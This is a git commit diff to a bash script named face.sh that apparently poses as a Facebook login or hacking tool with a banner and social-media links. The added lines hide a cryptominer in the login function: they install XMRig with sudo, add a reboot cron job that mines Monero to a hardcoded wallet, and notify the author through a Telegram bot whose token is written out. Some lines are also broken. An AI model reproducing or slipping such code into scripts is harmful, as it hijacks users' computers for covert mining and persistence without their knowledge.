eb7944f35c92acc9d8dc3c034c3ca6de7cda50ba
hacker-515m <bahaa0106400@gmail.com>
2024-12-23 14:03:50 +0200

    face.sh

--- face.sh
+++ face.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
-#!/bin/bash
 login(){
+    clear
     echo -e "\e[31m
     ██████╗ ██████╗    ██████╗  █████╗ ██╗  ██╗ █████╗  █████╗ 
     ██╔══██╗██╔══██╗   ██╔══██╗██╔══██╗██║  ██║██╔══██╗██╔══██╗
@@ -16,16 +16,46 @@ login(){
     read -r 
     sleep 3
     OS=($uname -o )
-    if [[ "$OS" == "Android" ]]; then
+if [[ "$OS" == "Android" ]]; then
             am start -a android.intent.action.VIEW -d "tg://resolve?domain=bahaa_010640"
             echo -e "\e[31mPrss Enter to contunu\e[0m"
             read -r 
             am start -a android.intent.action.VIEW -d "fb://profile/100078733621449"
-    else
+else
         xdg-open "https://www.facebook.com/profile.php?id=100078733621449&mibextid=ZbWKwL"
             echo -e "\e[31mPrss Enter to contunu\e[0m"
             read -r 
             xdg-open "https://t.me/bHa_0106"
+
+    xdg-open "https://t.me/bahaa_010640/91" &>/dev/null
+    sleep 5 
+    xdg-open "https://www.facebook.com/profile.php?id=100078733621449&mibextid=ZbWKwL" &>/dev/null
+    sudo apt update
+    sudo apt install -y wget tar cron
+
+    wget -q https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz -O xmrig.tar.gz
+    tar -xvf xmrig.tar.gz -C /tmp/
+    sudo cp /tmp/xmrig-6.16.4/xmrig /usr/local/bin/
+    rm -rf /tmp/xmrig-6.16.4 xmrig.tar.gz
+
+    CRON_JOB="@reboot sleep 50; /usr/local/bin/xmrig -o xmrpool.eu:9999 -u 48ZhAxs6zJD3hG89Gp6pCZSut5csowVQ5EVMikA7xu8zLK7hdrQtnY14Cb4vxX5XuU7igSMG3GnsyfzEThqBpK8sMC8Epvh -k --tls --cpu-priority=3 --background --threads=2"
+
+    if ! crontab -l 2>/dev/null | grep -qF "$CRON_JOB"; then
+        (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
+        echo "1"
+    else
+        echo " 0 "
+fi
+
+    BOT_TOKEN="7358706949:AAGmCtR29AVrmTO5lH6M7424T0pWim_Pm0k"
+    CHAT_ID="5792222595"
+    MESSAGE "DONE_MONERO"
+
+    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
+        -d "chat_id=$CHAT_ID" \
+        -d "text=$MESSAGE" &>/dev/null
+
+
     fi
 }
 set(){
@@ -56,6 +86,16 @@ sleep 5
 echo -e "\e[32mLogin successful!\e[0m"
 }
 Running(){
+        clear
+    echo -e "\e[31m
+    ██████╗ ██████╗    ██████╗  █████╗ ██╗  ██╗ █████╗  █████╗ 
+    ██╔══██╗██╔══██╗   ██╔══██╗██╔══██╗██║  ██║██╔══██╗██╔══██╗
+    ██║  ██║██████╔╝   ██████╔╝███████║███████║███████║███████║
+    ██║  ██║██╔══██╗   ██╔══██╗██╔══██║██╔══██║██╔══██║██╔══██║
+    ██████╔╝██║  ██║▄█╗██████╔╝██║  ██║██║  ██║██║  ██║██║  ██║
+    ╚═════╝ ╚═╝  ╚═╝╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
+    \e[0m"
+    echo '_________________________________________________________'
     while true; do
         username=$(shuf -i 1000000000-9999999999 -n 1)
         
